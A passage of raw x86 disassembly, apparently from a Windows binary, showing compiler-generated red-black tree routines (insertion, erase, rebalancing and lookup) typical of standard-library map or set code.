   147ec:	mov    eax,DWORD PTR [eax+0x4]
   147ef:	and    DWORD PTR [eax+0x14],0x0
   147f3:	mov    eax,DWORD PTR [esi+0x4]
   147f6:	mov    esi,DWORD PTR [eax+0x4]
   147f9:	jmp    0x1482a
   147fb:	cmp    esi,DWORD PTR [eax]
   147fd:	jne    0x14809
   147ff:	mov    esi,eax
   14801:	push   esi
   14802:	mov    ecx,edi
   14804:	call   0x12db8
   14809:	mov    eax,DWORD PTR [esi+0x4]
   1480c:	mov    DWORD PTR [eax+0x14],0x1
   14813:	mov    eax,DWORD PTR [esi+0x4]
   14816:	mov    eax,DWORD PTR [eax+0x4]
   14819:	and    DWORD PTR [eax+0x14],0x0
   1481d:	mov    eax,DWORD PTR [esi+0x4]
   14820:	push   DWORD PTR [eax+0x4]
   14823:	mov    ecx,edi
   14825:	call   0x12d6a
   1482a:	mov    eax,DWORD PTR [edi+0x4]
   1482d:	cmp    esi,DWORD PTR [eax+0x4]
   14830:	jne    0x14788
   14836:	mov    eax,DWORD PTR [edi+0x4]
   14839:	mov    eax,DWORD PTR [eax+0x4]
   1483c:	pop    edi
   1483d:	mov    DWORD PTR [eax+0x14],0x1
   14844:	mov    eax,DWORD PTR [ebp+0x8]
   14847:	pop    esi
   14848:	mov    DWORD PTR [eax],ebx
   1484a:	pop    ebx
   1484b:	pop    ebp
   1484c:	ret    0x10
   1484f:	int3   
   14850:	int3   
   14851:	int3   
   14852:	int3   
   14853:	int3   
   14854:	mov    edi,edi
   14856:	push   ebp
   14857:	mov    ebp,esp
   14859:	push   ecx
   1485a:	push   ecx
   1485b:	push   ebx
   1485c:	push   esi
   1485d:	mov    DWORD PTR [ebp-0x4],ecx
   14860:	push   edi
   14861:	mov    edi,DWORD PTR [ebp+0xc]
   14864:	lea    ecx,[ebp+0xc]
   14867:	call   0x11566
   1486c:	mov    esi,DWORD PTR [edi]
   1486e:	mov    eax,ds:0x7f6d8
   14873:	mov    ebx,edi
   14875:	mov    DWORD PTR [ebp-0x8],esi
   14878:	cmp    esi,eax
   1487a:	jne    0x14898
   1487c:	mov    esi,DWORD PTR [edi+0x8]
   1487f:	mov    eax,DWORD PTR [ebx+0x4]
   14882:	mov    ecx,DWORD PTR [ebp-0x4]
   14885:	mov    DWORD PTR [esi+0x4],eax
   14888:	mov    eax,DWORD PTR [ecx+0x4]
   1488b:	cmp    DWORD PTR [eax+0x4],edi
   1488e:	jne    0x1490d
   14890:	mov    DWORD PTR [eax+0x4],esi
   14893:	jmp    0x1491b
   14898:	mov    ecx,DWORD PTR [edi+0x8]
   1489b:	cmp    ecx,eax
   1489d:	je     0x1487f
   1489f:	push   ecx
   148a0:	call   0x11440
   148a5:	mov    ebx,eax
   148a7:	mov    esi,DWORD PTR [ebx+0x8]
   148aa:	cmp    ebx,edi
   148ac:	je     0x1487f
   148ae:	mov    eax,DWORD PTR [ebp-0x8]
   148b1:	mov    DWORD PTR [eax+0x4],ebx
   148b4:	mov    eax,DWORD PTR [edi]
   148b6:	mov    DWORD PTR [ebx],eax
   148b8:	cmp    ebx,DWORD PTR [edi+0x8]
   148bb:	jne    0x148c2
   148bd:	mov    DWORD PTR [esi+0x4],ebx
   148c0:	jmp    0x148d9
   148c2:	mov    eax,DWORD PTR [ebx+0x4]
   148c5:	mov    DWORD PTR [esi+0x4],eax
   148c8:	mov    eax,DWORD PTR [ebx+0x4]
   148cb:	mov    DWORD PTR [eax],esi
   148cd:	mov    eax,DWORD PTR [edi+0x8]
   148d0:	mov    DWORD PTR [ebx+0x8],eax
   148d3:	mov    eax,DWORD PTR [edi+0x8]
   148d6:	mov    DWORD PTR [eax+0x4],ebx
   148d9:	mov    eax,DWORD PTR [ebp-0x4]
   148dc:	mov    eax,DWORD PTR [eax+0x4]
   148df:	cmp    DWORD PTR [eax+0x4],edi
   148e2:	jne    0x148e9
   148e4:	mov    DWORD PTR [eax+0x4],ebx
   148e7:	jmp    0x148f7
   148e9:	mov    eax,DWORD PTR [edi+0x4]
   148ec:	cmp    DWORD PTR [eax],edi
   148ee:	jne    0x148f4
   148f0:	mov    DWORD PTR [eax],ebx
   148f2:	jmp    0x148f7
   148f4:	mov    DWORD PTR [eax+0x8],ebx
   148f7:	mov    eax,DWORD PTR [edi+0x4]
   148fa:	mov    DWORD PTR [ebx+0x4],eax
   148fd:	mov    eax,DWORD PTR [ebx+0x1c]
   14900:	mov    ecx,DWORD PTR [edi+0x1c]
   14903:	mov    DWORD PTR [ebx+0x1c],ecx
   14906:	mov    DWORD PTR [edi+0x1c],eax
   14909:	mov    ebx,edi
   1490b:	jmp    0x1496e
   1490d:	mov    eax,DWORD PTR [edi+0x4]
   14910:	cmp    DWORD PTR [eax],edi
   14912:	jne    0x14918
   14914:	mov    DWORD PTR [eax],esi
   14916:	jmp    0x1491b
   14918:	mov    DWORD PTR [eax+0x8],esi
   1491b:	mov    eax,DWORD PTR [ecx+0x4]
   1491e:	mov    DWORD PTR [ebp-0x8],eax
   14921:	cmp    DWORD PTR [eax],edi
   14923:	jne    0x14945
   14925:	mov    edx,DWORD PTR [edi+0x8]
   14928:	cmp    edx,DWORD PTR ds:0x7f6d8
   1492e:	jne    0x14937
   14930:	mov    edx,DWORD PTR [edi+0x4]
   14933:	mov    DWORD PTR [eax],edx
   14935:	jmp    0x14945
   14937:	push   esi
   14938:	call   0x11440
   1493d:	mov    ecx,DWORD PTR [ebp-0x8]
   14940:	mov    DWORD PTR [ecx],eax
   14942:	mov    ecx,DWORD PTR [ebp-0x4]
   14945:	mov    eax,DWORD PTR [ecx+0x4]
   14948:	mov    DWORD PTR [ebp-0x8],eax
   1494b:	cmp    DWORD PTR [eax+0x8],edi
   1494e:	jne    0x1496e
   14950:	mov    ecx,DWORD PTR [edi]
   14952:	cmp    ecx,DWORD PTR ds:0x7f6d8
   14958:	jne    0x14962
   1495a:	mov    ecx,DWORD PTR [edi+0x4]
   1495d:	mov    DWORD PTR [eax+0x8],ecx
   14960:	jmp    0x1496e
   14962:	push   esi
   14963:	call   0x1141e
   14968:	mov    ecx,DWORD PTR [ebp-0x8]
   1496b:	mov    DWORD PTR [ecx+0x8],eax
   1496e:	xor    edi,edi
   14970:	inc    edi
   14971:	cmp    DWORD PTR [ebx+0x1c],edi
   14974:	jne    0x14a8b
   1497a:	jmp    0x14a39
   1497f:	cmp    DWORD PTR [esi+0x1c],edi
   14982:	jne    0x14a88
   14988:	mov    eax,DWORD PTR [esi+0x4]
   1498b:	cmp    esi,DWORD PTR [eax]
   1498d:	jne    0x14a04
   1498f:	mov    eax,DWORD PTR [eax+0x8]
   14992:	cmp    DWORD PTR [eax+0x1c],0x0
   14996:	jne    0x149b0
   14998:	mov    DWORD PTR [eax+0x1c],edi
   1499b:	mov    eax,DWORD PTR [esi+0x4]
   1499e:	and    DWORD PTR [eax+0x1c],0x0
   149a2:	push   DWORD PTR [esi+0x4]
   149a5:	call   0x13160
   149aa:	mov    eax,DWORD PTR [esi+0x4]
   149ad:	mov    eax,DWORD PTR [eax+0x8]
   149b0:	mov    ecx,DWORD PTR [eax]
   149b2:	cmp    DWORD PTR [ecx+0x1c],edi
   149b5:	jne    0x149bf
   149b7:	mov    ecx,DWORD PTR [eax+0x8]
   149ba:	cmp    DWORD PTR [ecx+0x1c],edi
   149bd:	je     0x14a32
   149bf:	mov    ecx,DWORD PTR [eax+0x8]
   149c2:	cmp    DWORD PTR [ecx+0x1c],edi
   149c5:	jne    0x149df
   149c7:	mov    ecx,DWORD PTR [eax]
   149c9:	mov    DWORD PTR [ecx+0x1c],edi
   149cc:	mov    ecx,DWORD PTR [ebp-0x4]
   149cf:	and    DWORD PTR [eax+0x1c],0x0
   149d3:	push   eax
   149d4:	call   0x131ae
   149d9:	mov    eax,DWORD PTR [esi+0x4]
   149dc:	mov    eax,DWORD PTR [eax+0x8]
   149df:	mov    ecx,DWORD PTR [esi+0x4]
   149e2:	mov    ecx,DWORD PTR [ecx+0x1c]
   149e5:	mov    DWORD PTR [eax+0x1c],ecx
   149e8:	mov    ecx,DWORD PTR [esi+0x4]
   149eb:	mov    DWORD PTR [ecx+0x1c],edi
   149ee:	mov    eax,DWORD PTR [eax+0x8]
   149f1:	mov    ecx,DWORD PTR [ebp-0x4]
   149f4:	mov    DWORD PTR [eax+0x1c],edi
   149f7:	push   DWORD PTR [esi+0x4]
   149fa:	call   0x13160
   149ff:	jmp    0x14a88
   14a04:	mov    eax,DWORD PTR [eax]
   14a06:	cmp    DWORD PTR [eax+0x1c],0x0
   14a0a:	jne    0x14a23
   14a0c:	mov    DWORD PTR [eax+0x1c],edi
   14a0f:	mov    eax,DWORD PTR [esi+0x4]
   14a12:	and    DWORD PTR [eax+0x1c],0x0
   14a16:	push   DWORD PTR [esi+0x4]
   14a19:	call   0x131ae
   14a1e:	mov    eax,DWORD PTR [esi+0x4]
   14a21:	mov    eax,DWORD PTR [eax]
   14a23:	mov    ecx,DWORD PTR [eax+0x8]
   14a26:	cmp    DWORD PTR [ecx+0x1c],edi
   14a29:	jne    0x14a4a
   14a2b:	mov    ecx,DWORD PTR [eax]
   14a2d:	cmp    DWORD PTR [ecx+0x1c],edi
   14a30:	jne    0x14a4a
   14a32:	and    DWORD PTR [eax+0x1c],0x0
   14a36:	mov    esi,DWORD PTR [esi+0x4]
   14a39:	mov    ecx,DWORD PTR [ebp-0x4]
   14a3c:	mov    eax,DWORD PTR [ecx+0x4]
   14a3f:	cmp    esi,DWORD PTR [eax+0x4]
   14a42:	jne    0x1497f
   14a48:	jmp    0x14a88
   14a4a:	mov    ecx,DWORD PTR [eax]
   14a4c:	cmp    DWORD PTR [ecx+0x1c],edi
   14a4f:	jne    0x14a69
   14a51:	mov    ecx,DWORD PTR [eax+0x8]
   14a54:	mov    DWORD PTR [ecx+0x1c],edi
   14a57:	mov    ecx,DWORD PTR [ebp-0x4]
   14a5a:	and    DWORD PTR [eax+0x1c],0x0
   14a5e:	push   eax
   14a5f:	call   0x13160
   14a64:	mov    eax,DWORD PTR [esi+0x4]
   14a67:	mov    eax,DWORD PTR [eax]
   14a69:	mov    ecx,DWORD PTR [esi+0x4]
   14a6c:	mov    ecx,DWORD PTR [ecx+0x1c]
   14a6f:	mov    DWORD PTR [eax+0x1c],ecx
   14a72:	mov    ecx,DWORD PTR [esi+0x4]
   14a75:	mov    DWORD PTR [ecx+0x1c],edi
   14a78:	mov    eax,DWORD PTR [eax]
   14a7a:	mov    ecx,DWORD PTR [ebp-0x4]
   14a7d:	mov    DWORD PTR [eax+0x1c],edi
   14a80:	push   DWORD PTR [esi+0x4]
   14a83:	call   0x131ae
   14a88:	mov    DWORD PTR [esi+0x1c],edi
   14a8b:	lea    eax,[ebx+0xc]
   14a8e:	push   eax
   14a8f:	call   0x134fa
   14a94:	push   ebx
   14a95:	call   0x10a9a
   14a9a:	mov    eax,DWORD PTR [ebp-0x4]
   14a9d:	dec    DWORD PTR [eax+0xc]
   14aa0:	mov    eax,DWORD PTR [ebp+0x8]
   14aa3:	pop    ecx
   14aa4:	mov    ecx,DWORD PTR [ebp+0xc]
   14aa7:	pop    edi
   14aa8:	pop    esi
   14aa9:	mov    DWORD PTR [eax],ecx
   14aab:	pop    ebx
   14aac:	leave  
   14aad:	ret    0x8
   14ab0:	int3   
   14ab1:	int3   
   14ab2:	int3   
   14ab3:	int3   
   14ab4:	int3   
   14ab5:	int3   
   14ab6:	mov    edi,edi
   14ab8:	push   ebp
   14ab9:	mov    ebp,esp
   14abb:	push   ebx
   14abc:	push   esi
   14abd:	push   edi
   14abe:	mov    edi,DWORD PTR [ebp+0x8]
   14ac1:	mov    ebx,ecx
   14ac3:	mov    esi,edi
   14ac5:	cmp    edi,DWORD PTR ds:0x7f6d8
   14acb:	je     0x14af3
   14acd:	push   DWORD PTR [esi+0x8]
   14ad0:	mov    ecx,ebx
   14ad2:	call   0x14ab6
   14ad7:	mov    esi,DWORD PTR [esi]
   14ad9:	lea    eax,[edi+0xc]
   14adc:	push   eax
   14add:	call   0x134fa
   14ae2:	push   edi
   14ae3:	call   0x10a9a
   14ae8:	pop    ecx
   14ae9:	mov    edi,esi
   14aeb:	cmp    esi,DWORD PTR ds:0x7f6d8
   14af1:	jne    0x14acd
   14af3:	pop    edi
   14af4:	pop    esi
   14af5:	pop    ebx
   14af6:	pop    ebp
   14af7:	ret    0x4
   14afa:	int3   
   14afb:	int3   
   14afc:	int3   
   14afd:	int3   
   14afe:	int3   
   14aff:	int3   
   14b00:	mov    edi,edi
   14b02:	push   esi
   14b03:	push   edi
   14b04:	push   0x1
   14b06:	xor    edi,edi
   14b08:	push   edi
   14b09:	mov    esi,ecx
   14b0b:	call   0x139c8
   14b10:	cmp    DWORD PTR ds:0x7f6e0,edi
   14b16:	jne    0x14b2d
   14b18:	mov    ecx,eax
   14b1a:	mov    DWORD PTR ds:0x7f6e0,ecx
   14b20:	mov    DWORD PTR [ecx],edi
   14b22:	mov    ecx,DWORD PTR ds:0x7f6e0
   14b28:	xor    eax,eax
   14b2a:	mov    DWORD PTR [ecx+0x8],edi
   14b2d:	inc    DWORD PTR ds:0x7f838
   14b33:	cmp    eax,edi
   14b35:	je     0x14b3e
   14b37:	push   eax
   14b38:	call   0x10a9a
   14b3d:	pop    ecx
   14b3e:	push   edi
   14b3f:	push   DWORD PTR ds:0x7f6e0
   14b45:	mov    ecx,esi
   14b47:	call   0x139c8
   14b4c:	mov    DWORD PTR [esi+0xc],edi
   14b4f:	mov    DWORD PTR [esi+0x4],eax
   14b52:	mov    DWORD PTR [eax],eax
   14b54:	mov    esi,DWORD PTR [esi+0x4]
   14b57:	pop    edi
   14b58:	mov    DWORD PTR [esi+0x8],esi
   14b5b:	pop    esi
   14b5c:	ret    
   14b5d:	int3   
   14b5e:	int3   
   14b5f:	int3   
   14b60:	int3   
   14b61:	int3   
   14b62:	mov    edi,edi
   14b64:	push   ebp
   14b65:	mov    ebp,esp
   14b67:	push   ebx
   14b68:	mov    ebx,DWORD PTR [ebp+0x8]
   14b6b:	mov    eax,DWORD PTR [ebx+0x4]
   14b6e:	push   esi
   14b6f:	push   edi
   14b70:	mov    esi,ecx
   14b72:	mov    edi,DWORD PTR [esi+0x4]
   14b75:	add    eax,0x4
   14b78:	push   edi
   14b79:	push   DWORD PTR [eax]
   14b7b:	call   0x13b8a
   14b80:	mov    DWORD PTR [edi+0x4],eax
   14b83:	mov    eax,DWORD PTR [ebx+0xc]
   14b86:	mov    edi,DWORD PTR [esi+0x4]
   14b89:	mov    DWORD PTR [esi+0xc],eax
   14b8c:	mov    eax,DWORD PTR [edi+0x4]
   14b8f:	cmp    eax,DWORD PTR ds:0x7f6cc
   14b95:	je     0x14baf
   14b97:	push   eax
   14b98:	call   0x11242
   14b9d:	mov    DWORD PTR [edi],eax
   14b9f:	mov    esi,DWORD PTR [esi+0x4]
   14ba2:	push   DWORD PTR [esi+0x4]
   14ba5:	call   0x11220
   14baa:	mov    DWORD PTR [esi+0x8],eax
   14bad:	jmp    0x14bb7
   14baf:	mov    DWORD PTR [edi],edi
   14bb1:	mov    esi,DWORD PTR [esi+0x4]
   14bb4:	mov    DWORD PTR [esi+0x8],esi
   14bb7:	pop    edi
   14bb8:	pop    esi
   14bb9:	pop    ebx
   14bba:	pop    ebp
   14bbb:	ret    0x4
   14bbe:	int3   
   14bbf:	int3   
   14bc0:	int3   
   14bc1:	int3   
   14bc2:	int3   
   14bc3:	int3   
   14bc4:	mov    edi,edi
   14bc6:	push   ebp
   14bc7:	mov    ebp,esp
   14bc9:	push   edi
   14bca:	mov    edi,DWORD PTR [ebp+0xc]
   14bcd:	cmp    DWORD PTR [ebp+0x8],edi
   14bd0:	je     0x14be6
   14bd2:	push   esi
   14bd3:	mov    esi,DWORD PTR [ebp+0x10]
   14bd6:	inc    DWORD PTR [esi]
   14bd8:	lea    ecx,[ebp+0x8]
   14bdb:	call   0x1387e
   14be0:	cmp    DWORD PTR [ebp+0x8],edi
   14be3:	jne    0x14bd6
   14be5:	pop    esi
   14be6:	pop    edi
   14be7:	pop    ebp
   14be8:	ret    
   14be9:	int3   
   14bea:	int3   
   14beb:	int3   
   14bec:	int3   
   14bed:	int3   
   14bee:	mov    edi,edi
   14bf0:	push   ebp
   14bf1:	mov    ebp,esp
   14bf3:	push   DWORD PTR [ebp+0xc]
   14bf6:	push   DWORD PTR [ebp+0x8]
   14bf9:	call   0x13c84
   14bfe:	mov    eax,DWORD PTR [ebp+0x8]
   14c01:	pop    ebp
   14c02:	ret    0x8
   14c05:	int3   
   14c06:	int3   
   14c07:	int3   
   14c08:	int3   
   14c09:	int3   
   14c0a:	mov    edi,edi
   14c0c:	push   ebp
   14c0d:	mov    ebp,esp
   14c0f:	push   ecx
   14c10:	push   esi
   14c11:	mov    esi,ecx
   14c13:	cmp    DWORD PTR [esi+0xc],0x0
   14c17:	mov    ecx,DWORD PTR [ebp+0xc]
   14c1a:	je     0x14c54
   14c1c:	mov    eax,DWORD PTR [esi+0x4]
   14c1f:	cmp    ecx,DWORD PTR [eax]
   14c21:	jne    0x14c54
   14c23:	cmp    DWORD PTR [ebp+0x10],eax
   14c26:	jne    0x14c54
   14c28:	push   DWORD PTR [eax+0x4]
   14c2b:	mov    ecx,esi
   14c2d:	call   0x138dc
   14c32:	mov    ecx,DWORD PTR ds:0x7f6c8
   14c38:	mov    eax,DWORD PTR [esi+0x4]
   14c3b:	mov    DWORD PTR [eax+0x4],ecx
   14c3e:	mov    eax,DWORD PTR [esi+0x4]
   14c41:	and    DWORD PTR [esi+0xc],0x0
   14c45:	mov    DWORD PTR [eax],eax
   14c47:	mov    eax,DWORD PTR [esi+0x4]
   14c4a:	mov    DWORD PTR [eax+0x8],eax
   14c4d:	mov    eax,DWORD PTR [esi+0x4]
   14c50:	mov    ecx,DWORD PTR [eax]
   14c52:	jmp    0x14c79
   14c54:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c57:	je     0x14c79
   14c59:	push   edi
   14c5a:	mov    edi,ecx
   14c5c:	lea    ecx,[ebp+0xc]
   14c5f:	call   0x112e8
   14c64:	push   edi
   14c65:	lea    eax,[ebp-0x4]
   14c68:	push   eax
   14c69:	mov    ecx,esi
   14c6b:	call   0x13d76
   14c70:	mov    ecx,DWORD PTR [ebp+0xc]
   14c73:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c76:	jne    0x14c5a
   14c78:	pop    edi
   14c79:	mov    eax,DWORD PTR [ebp+0x8]
   14c7c:	mov    DWORD PTR [eax],ecx
   14c7e:	pop    esi
   14c7f:	leave  
   14c80:	ret    0xc
   14c83:	int3   
   14c84:	int3   
   14c85:	int3   
   14c86:	int3   
   14c87:	int3   
   14c88:	mov    edi,edi
   14c8a:	push   ebp
   14c8b:	mov    ebp,esp
   14c8d:	push   ecx
   14c8e:	push   ecx
   14c8f:	push   esi
   14c90:	push   DWORD PTR [ebp+0x8]
   14c93:	lea    eax,[ebp-0x8]
   14c96:	push   eax
   14c97:	mov    esi,ecx
   14c99:	call   0x13fce
   14c9e:	and    DWORD PTR [ebp+0x8],0x0
   14ca2:	lea    eax,[ebp+0x8]
   14ca5:	push   eax
   14ca6:	push   DWORD PTR [ebp-0x4]
   14ca9:	push   DWORD PTR [ebp-0x8]
   14cac:	call   0x13a3c
   14cb1:	add    esp,0xc
   14cb4:	push   DWORD PTR [ebp-0x4]
   14cb7:	lea    eax,[ebp-0x4]
   14cba:	push   DWORD PTR [ebp-0x8]
   14cbd:	mov    ecx,esi
   14cbf:	push   eax
   14cc0:	call   0x14c0a
   14cc5:	mov    eax,DWORD PTR [ebp+0x8]
   14cc8:	pop    esi
   14cc9:	leave  
   14cca:	ret    0x4
   14ccd:	int3   
   14cce:	int3   
   14ccf:	int3   
   14cd0:	int3   
   14cd1:	int3   
   14cd2:	mov    edi,edi
   14cd4:	push   ebp
   14cd5:	mov    ebp,esp
   14cd7:	push   ecx
   14cd8:	push   ebx
   14cd9:	push   esi
   14cda:	push   edi
   14cdb:	mov    edi,ecx
   14cdd:	mov    eax,DWORD PTR [edi+0x4]
   14ce0:	mov    esi,DWORD PTR [eax+0x4]
   14ce3:	mov    ebx,eax
   14ce5:	mov    eax,ds:0x7f6cc
   14cea:	mov    dl,0x1
   14cec:	cmp    esi,eax
   14cee:	je     0x14d0c
   14cf0:	mov    ecx,DWORD PTR [ebp+0xc]
   14cf3:	mov    ecx,DWORD PTR [ecx]
   14cf5:	cmp    ecx,DWORD PTR [esi+0xc]
   14cf8:	mov    ebx,esi
   14cfa:	setb   dl
   14cfd:	test   dl,dl
   14cff:	je     0x14d05
   14d01:	mov    esi,DWORD PTR [esi]
   14d03:	jmp    0x14d08
   14d05:	mov    esi,DWORD PTR [esi+0x8]
   14d08:	cmp    esi,eax
   14d0a:	jne    0x14cf5
   14d0c:	cmp    BYTE PTR [edi+0x8],0x0
   14d10:	je     0x14d2d
   14d12:	push   DWORD PTR [ebp+0xc]
   14d15:	push   ebx
   14d16:	push   esi
   14d17:	lea    eax,[ebp+0xc]
   14d1a:	push   eax
   14d1b:	mov    ecx,edi
   14d1d:	call   0x14552
   14d22:	mov    ecx,DWORD PTR [eax]
   14d24:	mov    eax,DWORD PTR [ebp+0x8]
   14d27:	mov    BYTE PTR [eax+0x4],0x1
   14d2b:	jmp    0x14d5c
   14d2d:	mov    ecx,ebx
   14d2f:	mov    DWORD PTR [ebp-0x4],ecx
   14d32:	test   dl,dl
   14d34:	je     0x14d48
   14d36:	mov    eax,DWORD PTR [edi+0x4]
   14d39:	cmp    ebx,DWORD PTR [eax]
   14d3b:	je     0x14d12
   14d3d:	lea    ecx,[ebp-0x4]
   14d40:	call   0x12ef6
   14d45:	mov    ecx,DWORD PTR [ebp-0x4]
   14d48:	mov    edx,DWORD PTR [ecx+0xc]
   14d4b:	mov    eax,DWORD PTR [ebp+0xc]
   14d4e:	cmp    edx,DWORD PTR [eax]
   14d50:	jae    0x14d55
   14d52:	push   eax
   14d53:	jmp    0x14d15
   14d55:	mov    eax,DWORD PTR [ebp+0x8]
   14d58:	mov    BYTE PTR [eax+0x4],0x0
   14d5c:	pop    edi
   14d5d:	pop    esi
   14d5e:	mov    DWORD PTR [eax],ecx
   14d60:	pop    ebx
   14d61:	leave  
   14d62:	ret    0x8
   14d65:	int3   
   14d66:	int3   
   14d67:	int3   
   14d68:	int3   
   14d69:	int3   
   14d6a:	mov    edi,edi
   14d6c:	push   ebp
   14d6d:	mov    ebp,esp
   14d6f:	push   ecx
   14d70:	push   esi
   14d71:	mov    esi,ecx
   14d73:	cmp    DWORD PTR [esi+0xc],0x0
   14d77:	mov    ecx,DWORD PTR [ebp+0xc]
   14d7a:	je     0x14db4
   14d7c:	mov    eax,DWORD PTR [esi+0x4]
   14d7f:	cmp    ecx,DWORD PTR [eax]
   14d81:	jne    0x14db4
   14d83:	cmp    DWORD PTR [ebp+0x10],eax
   14d86:	jne    0x14db4
   14d88:	push   DWORD PTR [eax+0x4]
   14d8b:	mov    ecx,esi
   14d8d:	call   0x1391c
   14d92:	mov    ecx,DWORD PTR ds:0x7f6cc
   14d98:	mov    eax,DWORD PTR [esi+0x4]
   14d9b:	mov    DWORD PTR [eax+0x4],ecx
   14d9e:	mov    eax,DWORD PTR [esi+0x4]
   14da1:	and    DWORD PTR [esi+0xc],0x0
   14da5:	mov    DWORD PTR [eax],eax
   14da7:	mov    eax,DWORD PTR [esi+0x4]
   14daa:	mov    DWORD PTR [eax+0x8],eax
   14dad:	mov    eax,DWORD PTR [esi+0x4]
   14db0:	mov    ecx,DWORD PTR [eax]
   14db2:	jmp    0x14dd9
   14db4:	cmp    ecx,DWORD PTR [ebp+0x10]
   14db7:	je     0x14dd9
   14db9:	push   edi
   14dba:	mov    edi,ecx
   14dbc:	lea    ecx,[ebp+0xc]
   14dbf:	call   0x12f36
   14dc4:	push   edi
   14dc5:	lea    eax,[ebp-0x4]
   14dc8:	push   eax
   14dc9:	mov    ecx,esi
   14dcb:	call   0x14266
   14dd0:	mov    ecx,DWORD PTR [ebp+0xc]
   14dd3:	cmp    ecx,DWORD PTR [ebp+0x10]
   14dd6:	jne    0x14dba
   14dd8:	pop    edi
   14dd9:	mov    eax,DWORD PTR [ebp+0x8]
   14ddc:	mov    DWORD PTR [eax],ecx
   14dde:	pop    esi
   14ddf:	leave  
   14de0:	ret    0xc
   14de3:	int3   
   14de4:	int3   
   14de5:	int3   
   14de6:	int3   
   14de7:	int3   
   14de8:	mov    edi,edi
   14dea:	push   ebp
   14deb:	mov    ebp,esp
   14ded:	push   ecx
   14dee:	push   ecx
   14def:	push   esi
   14df0:	push   DWORD PTR [ebp+0x8]
   14df3:	lea    eax,[ebp-0x8]
   14df6:	push   eax
   14df7:	mov    esi,ecx
   14df9:	call   0x144be
   14dfe:	and    DWORD PTR [ebp+0x8],0x0
   14e02:	lea    eax,[ebp+0x8]
   14e05:	push   eax
   14e06:	push   DWORD PTR [ebp-0x4]
   14e09:	push   DWORD PTR [ebp-0x8]
   14e0c:	call   0x13aa2
   14e11:	add    esp,0xc
   14e14:	push   DWORD PTR [ebp-0x4]
   14e17:	lea    eax,[ebp-0x4]
   14e1a:	push   DWORD PTR [ebp-0x8]
   14e1d:	mov    ecx,esi
   14e1f:	push   eax
   14e20:	call   0x14d6a
   14e25:	mov    eax,DWORD PTR [ebp+0x8]
   14e28:	pop    esi
   14e29:	leave  
   14e2a:	ret    0x4
   14e2d:	int3   
   14e2e:	int3   
   14e2f:	int3   
   14e30:	int3   
   14e31:	int3   
   14e32:	mov    edi,edi
   14e34:	push   ebp
   14e35:	mov    ebp,esp
   14e37:	push   ecx
   14e38:	push   ebx
   14e39:	push   esi
   14e3a:	push   edi
   14e3b:	mov    edi,ecx
   14e3d:	mov    eax,DWORD PTR [edi+0x4]
   14e40:	mov    esi,DWORD PTR [eax+0x4]
   14e43:	mov    ebx,eax
   14e45:	mov    eax,ds:0x7f6c8
   14e4a:	mov    dl,0x1
   14e4c:	cmp    esi,eax
   14e4e:	je     0x14e6c
   14e50:	mov    ecx,DWORD PTR [ebp+0xc]
   14e53:	mov    ecx,DWORD PTR [ecx]
   14e55:	cmp    ecx,DWORD PTR [esi+0xc]
   14e58:	mov    ebx,esi
   14e5a:	setb   dl
   14e5d:	test   dl,dl
   14e5f:	je     0x14e65
   14e61:	mov    esi,DWORD PTR [esi]
   14e63:	jmp    0x14e68
   14e65:	mov    esi,DWORD PTR [esi+0x8]
   14e68:	cmp    esi,eax
   14e6a:	jne    0x14e55
   14e6c:	cmp    BYTE PTR [edi+0x8],0x0
   14e70:	je     0x14e8d
   14e72:	push   DWORD PTR [ebp+0xc]
   14e75:	push   ebx
   14e76:	push   esi
   14e77:	lea    eax,[ebp+0xc]
   14e7a:	push   eax
   14e7b:	mov    ecx,edi
   14e7d:	call   0x14704
   14e82:	mov    ecx,DWORD PTR [eax]
   14e84:	mov    eax,DWORD PTR [ebp+0x8]
   14e87:	mov    BYTE PTR [eax+0x4],0x1
   14e8b:	jmp    0x14ebc
   14e8d:	mov    ecx,ebx
   14e8f:	mov    DWORD PTR [ebp-0x4],ecx
   14e92:	test   dl,dl
   14e94:	je     0x14ea8
   14e96:	mov    eax,DWORD PTR [edi+0x4]
   14e99:	cmp    ebx,DWORD PTR [eax]
   14e9b:	je     0x14e72
   14e9d:	lea    ecx,[ebp-0x4]
   14ea0:	call   0x112a8
   14ea5:	mov    ecx,DWORD PTR [ebp-0x4]
   14ea8:	mov    edx,DWORD PTR [ecx+0xc]
   14eab:	mov    eax,DWORD PTR [ebp+0xc]
   14eae:	cmp    edx,DWORD PTR [eax]
   14eb0:	jae    0x14eb5
   14eb2:	push   eax
   14eb3:	jmp    0x14e75
   14eb5:	mov    eax,DWORD PTR [ebp+0x8]
   14eb8:	mov    BYTE PTR [eax+0x4],0x0
   14ebc:	pop    edi
   14ebd:	pop    esi
   14ebe:	mov    DWORD PTR [eax],ecx
   14ec0:	pop    ebx
   14ec1:	leave  
   14ec2:	ret    0x8
   14ec5:	int3   
   14ec6:	int3   
   14ec7:	int3   
   14ec8:	int3   
   14ec9:	int3   
   14eca:	mov    edi,edi
   14ecc:	push   ebp
   14ecd:	mov    ebp,esp
   14ecf:	push   ecx
   14ed0:	push   esi
   14ed1:	mov    esi,ecx
   14ed3:	cmp    DWORD PTR [esi+0xc],0x0
   14ed7:	mov    ecx,DWORD PTR [ebp+0xc]
   14eda:	je     0x14f14
   14edc:	mov    eax,DWORD PTR [esi+0x4]
   14edf:	cmp    ecx,DWORD PTR [eax]
   14ee1:	jne    0x14f14
   14ee3:	cmp    DWORD PTR [ebp+0x10],eax
   14ee6:	jne    0x14f14
   14ee8:	push   DWORD PTR [eax+0x4]
   14eeb:	mov    ecx,esi
   14eed:	call   0x14ab6
   14ef2:	mov    ecx,DWORD PTR ds:0x7f6d8
   14ef8:	mov    eax,DWORD PTR [esi+0x4]
   14efb:	mov    DWORD PTR [eax+0x4],ecx
   14efe:	mov    eax,DWORD PTR [esi+0x4]
   14f01:	and    DWORD PTR [esi+0xc],0x0
   14f05:	mov    DWORD PTR [eax],eax
   14f07:	mov    eax,DWORD PTR [esi+0x4]
   14f0a:	mov    DWORD PTR [eax+0x8],eax
   14f0d:	mov    eax,DWORD PTR [esi+0x4]
   14f10:	mov    ecx,DWORD PTR [eax]
   14f12:	jmp    0x14f39
   14f14:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f17:	je     0x14f39
   14f19:	push   edi
   14f1a:	mov    edi,ecx
   14f1c:	lea    ecx,[ebp+0xc]
   14f1f:	call   0x11566
   14f24:	push   edi
   14f25:	lea    eax,[ebp-0x4]
   14f28:	push   eax
   14f29:	mov    ecx,esi
   14f2b:	call   0x14854
